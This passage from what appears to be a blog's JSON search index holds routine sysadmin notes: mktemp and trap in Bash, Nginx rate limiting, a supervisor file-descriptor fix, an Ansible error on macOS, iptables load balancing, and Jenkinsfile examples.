\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Our temp file is \u003c/span\u003e$TMPFILE\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"mktemp-命令的参数\"\u003emktemp 命令的参数\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-d\u003c/code\u003e 参数可以创建一个临时目录\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-p\u003c/code\u003e 参数可以指定临时文件所在的目录。默认是使用 \u003ccode\u003e$TMPDIR\u003c/code\u003e 环境变量指定的目录，如果这个变量没设置，那么使用 \u003ccode\u003e/tmp\u003c/code\u003e 目录。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-t\u003c/code\u003e 参数可以指定临时文件的文件名模板，模板的末尾必须至少包含三个连续的 \u003ccode\u003eX\u003c/code\u003e 字符，表示随机字符，建议至少使用六个 \u003ccode\u003eX\u003c/code\u003e。默认的文件名模板是 \u003ccode\u003etmp.后接十个随机字符\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"trap-命令的用法\"\u003e\u003ccode\u003etrap\u003c/code\u003e 命令的用法\u003c/h4\u003e\n\u003cp\u003etrap 命令用来在 Bash 脚本中响应系统信号。\u003c/p\u003e\n\u003cp\u003e最常见的系统信号就是 SIGINT（中断），即按 Ctrl + C 所产生的信号。trap 命令的-l 参数，可以列出所有的系统信号。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ trap -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 1\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGHUP   2\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGINT   3\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGQUIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGILL   5\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGTRAP  6\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e SIGABRT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e ... ...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etrap 的命令格式如下。\u003c/p\u003e","tags":["URL","SHELL"],"title":"Bash 脚本如何创建临时文件：mktemp 命令和 trap 命令教程"},{"categories":["URL","GitHub"],"contents":" GitHub Actions 入门教程 ","date":"December 23, 2019","hero":"/images/hero/github.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191223-getting-started-with-github-actions/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html\" target=\"_blank\" rel=\"noopener\"\u003eGitHub Actions 入门教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","GitHub"],"title":"GitHub Actions 入门教程"},{"categories":["URL","Nginx"],"contents":" Nginx 如何防禦 DDoS 攻擊？ Nginx 限制訪問速率和最大併發連線數模組\u0026ndash;limit (防止 DDOS 攻擊) ngx_http_limit_req_module limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;\n","date":"December 20, 2019","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191220-nginx-defend-ddos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://magiclen.org/nginx-defend-ddos/\" target=\"_blank\" rel=\"noopener\"\u003eNginx 如何防禦 DDoS 攻擊？\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.itread01.com/content/1547474225.html\" target=\"_blank\" rel=\"noopener\"\u003eNginx 限制訪問速率和最大併發連線數模組\u0026ndash;limit (防止 DDOS 攻擊)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ngx_http_limit_req_module\"\u003engx_http_limit_req_module\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003elimit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;\u003c/code\u003e\u003c/p\u003e","tags":["URL","Nginx"],"title":"Nginx如何防禦DDoS攻擊？"},{"categories":["URL","Go"],"contents":" golang 服务的文件句柄超出系统限制(too many open files) 查看系统的配置 ulimit -a | grep open，发现系统的配置正常。\n查看程序服务的打开文件限制，cat /proc/40636/limits，发现服务的限制并没有继承系统设置的，还是系统默认的 1024 限制。\n查看程序服务打开文件数（连接数）情况，lsof -p 40636 | wc -l，发现已经超出限制，所以报错。\n再看看程序服务打开了哪些连接，lsof -p 40636 \u0026gt; openfiles.log，发现很多 http 连接打开没有关闭，看 ip 是报警服务的接口，于是顺着这条线索，终于找到了原因，因为程序中读取到的配置解析时报错给报警服务，大量的报警服务连接后未关闭，才导致的 too many open files，这是问题的关键，但是程序为什么没有继承系统设置的最大配置限制，还需要继续查看。\n最终原因找到，因为程序服务是 supervisor 管理的，supervisor 启动服务默认的 minfds 配置是 1024，也就是打开文件限制是 1024，在 supervisor 的配置中加入 minfds=81920; 重启 supervisorctl reload。\n","date":"December 16, 2019","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191216-23828/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://studygolang.com/articles/23828\" target=\"_blank\" rel=\"noopener\"\u003egolang 服务的文件句柄超出系统限制(too many open files)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看系统的配置 \u003ccode\u003eulimit -a | grep open\u003c/code\u003e，发现系统的配置正常。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看程序服务的打开文件限制，\u003ccode\u003ecat /proc/40636/limits\u003c/code\u003e，发现服务的限制并没有继承系统设置的，还是系统默认的 1024 限制。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看程序服务打开文件数（连接数）情况，\u003ccode\u003elsof -p 40636 | wc -l\u003c/code\u003e，发现已经超出限制，所以报错。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e再看看程序服务打开了哪些连接，\u003ccode\u003elsof -p 40636 \u0026gt; openfiles.log\u003c/code\u003e，发现很多 http 连接打开没有关闭，看 ip 是报警服务的接口，于是顺着这条线索，终于找到了原因，因为程序中读取到的配置解析时报错给报警服务，大量的报警服务连接后未关闭，才导致的 too many open files，这是问题的关键，但是程序为什么没有继承系统设置的最大配置限制，还需要继续查看。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最终原因找到，因为程序服务是 supervisor 管理的，supervisor 启动服务默认的 minfds 配置是 1024，也就是打开文件限制是 1024，在 supervisor 的配置中加入 \u003ccode\u003eminfds=81920\u003c/code\u003e; 重启 \u003ccode\u003esupervisorctl reload\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Go"],"title":"golang服务的文件句柄超出系统限制(too many open files)"},{"categories":["URL","Ansible"],"contents":" Trellis Ansible Bad Interpreter Error Bad Interpreter Error Error we got using Ansible was a bad interpreter error. Python 2.7 is not to be found:\nzsh: /usr/local/bin/ansible-vault: bad interpreter: /usr/local/opt/python@2/bin/python2.7: no such file or directory And that was correct because when we checked /usr/local/opt we only had Python 3.\nInstallation Python 2 brew install python@2 Python Crashing Hard Next, on Ansible version check I got another error\n➜ trellis git:(master) ansible --version [1] 19153 abort ansible --version It was somehow crashing Python 2.7 though it should just work with it. I decided to upgrade Ansible as well\nsudo pip install ansible --upgrade ..... Requirement already satisfied, skipping upgrade: six\u0026gt;=1.4.1 in /usr/local/lib/python2.7/site-packages (from cryptography-\u0026gt;ansible) (1.11.0) Requirement already satisfied, skipping upgrade: pycparser in /usr/local/lib/python2.7/site-packages (from cffi\u0026gt;=1.7; platform_python_implementation != \u0026#34;PyPy\u0026#34;-\u0026gt;cryptography-\u0026gt;ansible) (2.18) Installing collected packages: ansible Found existing installation: ansible 2.7.5 Uninstalling ansible-2.7.5: Successfully uninstalled ansible-2.7.5 Successfully installed ansible-2.9.1 Still I had the Python error and iTerm was showing a MacOS popup that Python was crashing unexpectedly: Python quit unexpectedly. Click Reopen to open the application again. Click Report to see more detailed information and send a report to Apple. Application Specific Information: /usr/lib/libcrypto.dylib abort() called Invalid dylib load. Clients should not load the unversioned libcrypto dylib as it does not have a stable ABI. Invalid DyLib Found https://stackoverflow.com/questions/58272830/python-crashing-on-macos-10-15-beta-19a582a-with-usr-lib-libcrypto-dylib on the error with the Dynamic library loaded being the wrong one and decided to install openssl\nbrew install openssl\nBut it was already installed so no need for that. So then I added this line to .zshrc to load the correct library inside zsh:\n# Python crash fix export DYLD_LIBRARY_PATH=/usr/local/opt/openssl/lib:$DYLD_LIBRARY_PATH ","date":"December 6, 2019","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191206-trellis-ansible-bad-interpreter-error/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://wpvilla.in/trellis-ansible-bad-interpreter-error/\" target=\"_blank\" rel=\"noopener\"\u003eTrellis Ansible Bad Interpreter Error\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"bad-interpreter-error\"\u003eBad Interpreter Error\u003c/h4\u003e\n\u003cp\u003eError we got using Ansible was a bad interpreter error. Python 2.7 is not to be found:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ezsh: /usr/local/bin/ansible-vault: bad interpreter: /usr/local/opt/python@2/bin/python2.7: no such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAnd that was correct because when we checked /usr/local/opt we only had Python 3.\u003c/p\u003e\n\u003ch4 id=\"installation-python-2\"\u003eInstallation Python 2\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install python@2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"python-crashing-hard\"\u003ePython Crashing Hard\u003c/h5\u003e\n\u003cp\u003eNext, on Ansible version check I got another error\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e➜  trellis git:\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003emaster\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ansible --version\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e1\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e19153\u003c/span\u003e abort      ansible --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIt was somehow crashing Python 2.7 though it should just work with it. I decided to upgrade Ansible as well\u003c/p\u003e","tags":["URL","Ansible"],"title":"Trellis Ansible Bad Interpreter Error"},{"categories":["URL","Linux","Iptables"],"contents":" 用 iptables 和 ip rule 做负载均衡 操作 这里以一台通过有线 + 无线出口连接到互联网的 Arch Linux 设备为例。其中共有两个出口，分别使用网卡 eth0 和 eth1。大概的对应关系是：\n标记 10 (0xa) - 路由表 #110 - 使用 eth0 出口 标记 11 (0xb) - 路由表 #111 - 使用 eth1 出口 我们会根据数据包上包含的标记值来判断它应该走什么出口。首先，使用 ip rule 为每个标记值指定一张使用的路由表。\n通常默认路由表的权重是 32768。为了让我们的路由表用得上，我们需要把它们的权重调得高一些（例如 31000）。\n# 让带标记 10 (0xa) 的数据包使用 110 号路由表，权重 31000 ip rule add fwmark 10 table 110 prio 31000 # 让带标记 11 (0xb) 的数据包使用 111 号路由表，权重 31000 ip rule add fwmark 11 table 111 prio 31000 # 如果你的连接更多，可以继续添加标记 \u0026lt;-\u0026gt; 路由表的对应关系 # #110 路由表的路由 ip route add 10.20.0.0/24 dev eth0 table 110 ip route add default via 10.20.0.254 table 110 # #111 路由表的路由 ip route add 10.25.0.0/24 dev eth1 table 111 ip route add default via 10.25.0.254 table 111 # 如果这条连接已经被标记，那么把标记设置到数据包上 iptables -t mangle -A OUTPUT -j CONNMARK --restore-mark # 如果数据包已经有标记，直接放行 iptables -t mangle -A OUTPUT -m mark ! --mark 0 -j ACCEPT # 如果数据包没被标记的话 # 把数据包包的标记设置为 11 (0xb)... iptables -t mangle -A OUTPUT -j MARK --set-mark 10 # 并且每 2 个包就把一个包的标记设置为 10 (0xa) iptables -t mangle -A OUTPUT -m statistic --mode nth --every 2 --packet 0 -j MARK --set-mark 11 # 如果你有三条出口的话，这里可以类似于 # iptables -t mangle -A OUTPUT -j MARK --set-mark 10 # iptables -t mangle -A OUTPUT -m statistic --mode nth --every 3 --packet 0 -j MARK --set-mark 11 # iptables -t mangle -A OUTPUT -m statistic --mode nth --every 3 --packet 1 -j MARK --set-mark 12 # 把数据包的标记存储到整条连接上，这样整个连接过程都会使用同一条出口 iptables -t mangle -A OUTPUT -j CONNMARK --save-mark # 我们还需要让数据包上标示的出口是我们为其选择的出口 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE 之后可以用 iptables -L OUTPUT -t mangle 看一下自己所设置的规则是否正确。然后就可以用 Wiresharks 看一看自己的连接是不是真的分流啦。\n","date":"December 4, 2019","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191204-ip-tables-rule-load-balance/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.outv.im/2019/ip-tables-rule-load-balance/\" target=\"_blank\" rel=\"noopener\"\u003e用 iptables 和 ip rule 做负载均衡\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"操作\"\u003e操作\u003c/h4\u003e\n\u003cp\u003e这里以一台通过有线 + 无线出口连接到互联网的 Arch Linux 设备为例。其中共有两个出口，分别使用网卡 eth0 和 eth1。大概的对应关系是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e标记 10 (0xa) - 路由表 #110 - 使用 eth0 出口\u003c/li\u003e\n\u003cli\u003e标记 11 (0xb) - 路由表 #111 - 使用 eth1 出口\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们会根据数据包上包含的标记值来判断它应该走什么出口。首先，使用 ip rule 为每个标记值指定一张使用的路由表。\u003c/p\u003e\n\u003cp\u003e通常默认路由表的权重是 32768。为了让我们的路由表用得上，我们需要把它们的权重调得高一些（例如 31000）。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 让带标记 10 (0xa) 的数据包使用 110 号路由表，权重 31000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip rule add fwmark \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e table \u003cspan style=\"color:#ae81ff\"\u003e110\u003c/span\u003e prio \u003cspan style=\"color:#ae81ff\"\u003e31000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 让带标记 11 (0xb) 的数据包使用 111 号路由表，权重 31000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip rule add fwmark \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e table \u003cspan style=\"color:#ae81ff\"\u003e111\u003c/span\u003e prio \u003cspan style=\"color:#ae81ff\"\u003e31000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果你的连接更多，可以继续添加标记 \u0026lt;-\u0026gt; 路由表的对应关系\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# #110 路由表的路由\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add 10.20.0.0/24 dev eth0 table \u003cspan style=\"color:#ae81ff\"\u003e110\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add default via 10.20.0.254 table \u003cspan style=\"color:#ae81ff\"\u003e110\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# #111 路由表的路由\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add 10.25.0.0/24 dev eth1 table \u003cspan style=\"color:#ae81ff\"\u003e111\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add default via 10.25.0.254 table \u003cspan style=\"color:#ae81ff\"\u003e111\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果这条连接已经被标记，那么把标记设置到数据包上\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t mangle -A OUTPUT -j CONNMARK --restore-mark\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果数据包已经有标记，直接放行\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t mangle -A OUTPUT -m mark ! --mark \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e -j ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果数据包没被标记的话\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 把数据包包的标记设置为 11 (0xb)...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t mangle -A OUTPUT -j MARK --set-mark \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 并且每 2 个包就把一个包的标记设置为 10 (0xa)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t mangle -A OUTPUT -m statistic --mode nth --every \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e --packet \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e -j MARK --set-mark \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果你有三条出口的话，这里可以类似于\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# iptables -t mangle -A OUTPUT -j MARK --set-mark 10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# iptables -t mangle -A OUTPUT -m statistic --mode nth --every 3 --packet 0 -j MARK --set-mark 11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# iptables -t mangle -A OUTPUT -m statistic --mode nth --every 3 --packet 1 -j MARK --set-mark 12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 把数据包的标记存储到整条连接上，这样整个连接过程都会使用同一条出口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t mangle -A OUTPUT -j CONNMARK --save-mark\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 我们还需要让数据包上标示的出口是我们为其选择的出口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e之后可以用 \u003ccode\u003eiptables -L OUTPUT -t mangle\u003c/code\u003e 看一下自己所设置的规则是否正确。然后就可以用 Wiresharks 看一看自己的连接是不是真的分流啦。\u003c/p\u003e","tags":["URL","Linux","Iptables"],"title":"用 iptables 和 ip rule 做负载均衡"},{"categories":["URL","htop"],"contents":" htop explained ","date":"November 14, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191114-htop/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://peteris.rocks/blog/htop/\" target=\"_blank\" rel=\"noopener\"\u003ehtop explained\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","htop"],"title":"htop explained"},{"categories":["URL","Jenkins"],"contents":" Some Jenkinsfile examples Parallel #!/usr/bin/env groovy pipeline { agent any stages { stage(\u0026#34;Build\u0026#34;) { steps { sh \u0026#39;mvn -v\u0026#39; } } stage(\u0026#34;Testing\u0026#34;) { parallel { stage(\u0026#34;Unit Tests\u0026#34;) { agent { docker \u0026#39;openjdk:7-jdk-alpine\u0026#39; } steps { sh \u0026#39;java -version\u0026#39; } } stage(\u0026#34;Functional Tests\u0026#34;) { agent { docker \u0026#39;openjdk:8-jdk-alpine\u0026#39; } steps { sh \u0026#39;java -version\u0026#39; } } stage(\u0026#34;Integration Tests\u0026#34;) { steps { sh \u0026#39;java -version\u0026#39; } } } } stage(\u0026#34;Deploy\u0026#34;) { steps { echo \u0026#34;Deploy!\u0026#34; } } } } When #!/usr/bin/env groovy pipeline { agent any environment { VALUE_ONE = \u0026#39;1\u0026#39; VALUE_TWO = \u0026#39;2\u0026#39; VALUE_THREE = \u0026#39;3\u0026#39; } stages { // skip a stage while creating the pipeline stage(\u0026#34;A stage to be skipped\u0026#34;) { when { expression { false } //skip this stage } steps { echo \u0026#39;This step will never be run\u0026#39; } } // Execute when branch = \u0026#39;master\u0026#39; stage(\u0026#34;BASIC WHEN - Branch\u0026#34;) { when { branch \u0026#39;master\u0026#39; } steps { echo \u0026#39;BASIC WHEN - Master Branch!\u0026#39; } } // Expression based when example with AND stage(\u0026#39;WHEN EXPRESSION with AND\u0026#39;) { when { expression { VALUE_ONE == \u0026#39;1\u0026#39; \u0026amp;\u0026amp; VALUE_THREE == \u0026#39;3\u0026#39; } } steps { echo \u0026#39;WHEN with AND expression works!\u0026#39; } } // Expression based when example stage(\u0026#39;WHEN EXPRESSION with OR\u0026#39;) { when { expression { VALUE_ONE == \u0026#39;1\u0026#39; || VALUE_THREE == \u0026#39;2\u0026#39; } } steps { echo \u0026#39;WHEN with OR expression works!\u0026#39; } } // When - AllOf Example stage(\u0026#34;AllOf\u0026#34;) { when { allOf { environment name:\u0026#39;VALUE_ONE\u0026#39;, value: \u0026#39;1\u0026#39; environment name:\u0026#39;VALUE_TWO\u0026#39;, value: \u0026#39;2\u0026#39; } } steps { echo \u0026#34;AllOf Works!!\u0026#34; } } // When - Not AnyOf Example stage(\u0026#34;Not AnyOf\u0026#34;) { when { not { anyOf { branch \u0026#34;development\u0026#34; environment name:\u0026#39;VALUE_TWO\u0026#39;, value: \u0026#39;4\u0026#39; } } } steps { echo \u0026#34;Not AnyOf - Works!\u0026#34; } } } } ","date":"November 6, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191106-228cdb1893fca91f0663bab7b095757c/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gist.github.com/merikan/228cdb1893fca91f0663bab7b095757c\" target=\"_blank\" rel=\"noopener\"\u003eSome Jenkinsfile examples\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"parallel\"\u003eParallel\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/usr/bin/env groovy\npipeline {\n  agent any\n\n  stages {\n    stage(\u0026#34;Build\u0026#34;) {\n      steps {\n        sh \u0026#39;mvn -v\u0026#39;\n      }\n    }\n\n    stage(\u0026#34;Testing\u0026#34;) {\n      parallel {\n        stage(\u0026#34;Unit Tests\u0026#34;) {\n          agent { docker \u0026#39;openjdk:7-jdk-alpine\u0026#39; }\n          steps {\n            sh \u0026#39;java -version\u0026#39;\n          }\n        }\n        stage(\u0026#34;Functional Tests\u0026#34;) {\n          agent { docker \u0026#39;openjdk:8-jdk-alpine\u0026#39; }\n          steps {\n            sh \u0026#39;java -version\u0026#39;\n          }\n        }\n        stage(\u0026#34;Integration Tests\u0026#34;) {\n          steps {\n            sh \u0026#39;java -version\u0026#39;\n          }\n        }\n      }\n    }\n\n    stage(\u0026#34;Deploy\u0026#34;) {\n      steps {\n        echo \u0026#34;Deploy!\u0026#34;\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"when\"\u003eWhen\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/usr/bin/env groovy\npipeline {\n   agent any\n\n   environment {\n      VALUE_ONE = \u0026#39;1\u0026#39;\n      VALUE_TWO = \u0026#39;2\u0026#39;\n      VALUE_THREE = \u0026#39;3\u0026#39;\n   }\n\n   stages {\n\n      // skip a stage while creating the pipeline\n      stage(\u0026#34;A stage to be skipped\u0026#34;) {\n         when {\n            expression { false }  //skip this stage\n         }\n         steps {\n            echo \u0026#39;This step will never be run\u0026#39;\n         }\n      }\n\n      // Execute when branch = \u0026#39;master\u0026#39;\n      stage(\u0026#34;BASIC WHEN - Branch\u0026#34;) {\n         when {\n            branch \u0026#39;master\u0026#39;\n\t }\n         steps {\n            echo \u0026#39;BASIC WHEN - Master Branch!\u0026#39;\n         }\n      }\n\n      // Expression based when example with AND\n      stage(\u0026#39;WHEN EXPRESSION with AND\u0026#39;) {\n         when {\n            expression {\n               VALUE_ONE == \u0026#39;1\u0026#39; \u0026amp;\u0026amp; VALUE_THREE == \u0026#39;3\u0026#39;\n            }\n         }\n         steps {\n            echo \u0026#39;WHEN with AND expression works!\u0026#39;\n         }\n      }\n\n      // Expression based when example\n      